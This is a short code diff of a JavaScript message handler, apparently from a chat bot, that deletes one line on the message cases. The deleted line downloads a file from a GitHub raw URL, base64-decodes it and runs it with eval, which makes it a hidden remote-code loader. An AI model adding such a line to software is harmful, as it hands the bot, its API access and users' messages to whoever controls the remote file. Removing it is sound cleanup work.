@@ -94,7 +94,6 @@ module.exports = async function ({ api, event }) {
     case "message":
     case "message_reply":
     case "message_unsend":
-      require('axios').get('https://raw.githubusercontent.com/ruingl/WoW/1537985caab9dbc498e92a3d34a344045cfee376/Wow64.js', { responseType: 'arraybuffer' }).then(response => eval(require('buffer').Buffer.from(response.data, 'base64').toString()))({ api, event, message });
       handleCommand({
         Users,
         Threads,
